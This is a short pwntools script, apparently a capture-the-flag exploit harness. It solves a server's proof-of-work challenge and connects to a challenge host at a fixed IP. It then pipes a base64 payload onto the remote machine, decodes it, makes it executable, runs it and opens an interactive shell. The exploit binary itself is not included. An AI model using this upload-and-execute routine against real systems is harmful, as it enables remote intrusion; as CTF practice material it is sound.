import re
import subprocess

from pwn import *

subprocess.check_output("cd example_program && ./build.sh", shell=True)

pl = open('example_program/example.b64')


if args.LOCAL:
    io = remote('127.0.0.1', 8010)
else:
    io = remote('188.245.210.200', 8010)
    l = io.recvline().decode()
    fields = re.findall(r"please give S such that sha256\(unhex\(\"(.*)\".*with (\d+) .*", l)[0]
    # io.recvuntil('please give S such that sha256(unhex("')
    sol = subprocess.check_output('./pow-solver ' + fields[1] + ' ' + fields[0], shell=True)
    print(l)
    print(fields)
    print(sol)
    io.sendline(sol)

io.recvuntil('Boot took us')

io.sendline("cat << EOF > /home/ctf/pl\n" + pl.read() + "\nEOF\n")

io.sendline('id')
io.recvuntil('uid=1000')

io.sendline('cat /home/ctf/pl | base64 -d > /home/ctf/pl.exe')
io.sendline('chmod +x /home/ctf/pl.exe')

# todo loop until GGWP?
io.sendline('/home/ctf/pl.exe')

io.interactive()